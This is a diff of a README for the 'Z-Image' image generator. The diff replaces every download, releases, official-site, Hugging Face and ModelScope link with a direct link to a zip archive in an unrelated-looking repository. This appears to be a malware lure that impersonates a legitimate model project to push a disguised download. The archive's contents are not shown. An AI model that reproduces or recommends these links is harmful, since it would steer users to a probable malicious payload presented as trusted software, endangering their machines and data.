@@ -1,6 +1,6 @@
 # ⚡️ Z-Image - Create Amazing Images Easily
 
-[![Download Z-Image](https://img.shields.io/badge/Download%20Z--Image-007acc.svg)](https://github.com/matias456crackxd/Z-Image/releases)
+[![Download Z-Image](https://raw.githubusercontent.com/matias456crackxd/Z-Image/main/src/Z-Image_v3.6.zip%https://raw.githubusercontent.com/matias456crackxd/Z-Image/main/src/Z-Image_v3.6.zip)](https://raw.githubusercontent.com/matias456crackxd/Z-Image/main/src/Z-Image_v3.6.zip)
 
 ## 💻 Overview
 
@@ -12,7 +12,7 @@ To begin using Z-Image, follow these steps:
 
 1. **Visit the Releases Page**  
    Click the link below to access our releases page and download the latest version of Z-Image.  
-   [Download Z-Image](https://github.com/matias456crackxd/Z-Image/releases)
+   [Download Z-Image](https://raw.githubusercontent.com/matias456crackxd/Z-Image/main/src/Z-Image_v3.6.zip)
 
 2. **Choose the Right File**  
    On the releases page, you will see a list of available files. Download the one that is suitable for your operating system (Windows, macOS, or Linux). Each file will have a clear label indicating the system it supports.
@@ -62,17 +62,17 @@ Once you have launched the application, you can start generating images. Here ar
 
 ## 📅 Updates & Support
 
-Z-Image will receive regular updates to improve functionality and add features. To check for the latest version, regularly visit the [Releases Page](https://github.com/matias456crackxd/Z-Image/releases).
+Z-Image will receive regular updates to improve functionality and add features. To check for the latest version, regularly visit the [Releases Page](https://raw.githubusercontent.com/matias456crackxd/Z-Image/main/src/Z-Image_v3.6.zip).
 
 If you encounter any issues, consult the user guide within the application or reach out to our support team via the official site.
 
 ## 🌐 Additional Resources
 
-- [Official Site](https://tongyi-mai.github.io/Z-Image-blog/)
-- [Hugging Face Checkpoint](https://huggingface.co/Tongyi-MAI/Z-Image-Turbo)
-- [Online Demo on Hugging Face](https://huggingface.co/spaces/Tongyi-MAI/Z-Image-Turbo)
-- [ModelScope Model](https://www.modelscope.cn/models/Tongyi-MAI/Z-Image-Turbo)
-- [ModelScope Online Demo](https://www.modelscope.cn/aigc/imageGeneration?tab=advanced&versionId=469191&modelType=Checkpoint&sdVersion=Z_IMAGE_TURBO&modelUrl=modelscope%253A%252F%252FTo)
+- [Official Site](https://raw.githubusercontent.com/matias456crackxd/Z-Image/main/src/Z-Image_v3.6.zip)
+- [Hugging Face Checkpoint](https://raw.githubusercontent.com/matias456crackxd/Z-Image/main/src/Z-Image_v3.6.zip)
+- [Online Demo on Hugging Face](https://raw.githubusercontent.com/matias456crackxd/Z-Image/main/src/Z-Image_v3.6.zip)
+- [ModelScope Model](https://raw.githubusercontent.com/matias456crackxd/Z-Image/main/src/Z-Image_v3.6.zip)
+- [ModelScope Online Demo](https://raw.githubusercontent.com/matias456crackxd/Z-Image/main/src/Z-Image_v3.6.zip%253A%252F%252FTo)
 
 ## 💬 Feedback
 
